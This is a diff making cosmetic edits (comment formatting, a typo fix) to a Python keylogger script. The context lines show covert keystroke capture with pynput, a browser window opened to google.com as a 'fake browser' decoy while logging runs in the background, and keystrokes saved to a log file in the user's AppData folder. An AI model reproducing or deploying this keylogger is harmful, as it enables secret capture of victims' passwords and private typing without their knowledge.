@@ -1,4 +1,4 @@
-#------ Keylogger ---- #
+# ------ Keylogger ------
 
 import logging
 import os
@@ -6,7 +6,7 @@ import webbrowser
 
 from pynput import keyboard, mouse
 
-#---------- Fake Browser ---------#
+# ---------- Fake Browser ---------
 
 # Creating a "fake" browser page where it actually runs the keylogger
 url = 'http://www.google.com'
@@ -16,7 +16,7 @@ chrome_path = 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe %s &
 
 webbrowser.get(chrome_path).open(url)
 
-# Some keybooard events that will not be recorded
+# Some keyboard events that will not be recorded
 unimportant_types = [keyboard.Key.down, keyboard.Key.up, keyboard.Key.left,
                      keyboard.Key.right, keyboard.Key.end, keyboard.Key.home,
                      keyboard.Key.insert, keyboard.Key.media_next,
@@ -37,7 +37,6 @@ numeric_dict = {'<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5
 logPATH = os.environ['appdata'] + r'\log.txt'
 
 # Defining the keylogger functions that runs in the background
-
 
 def on_press(key):
     """
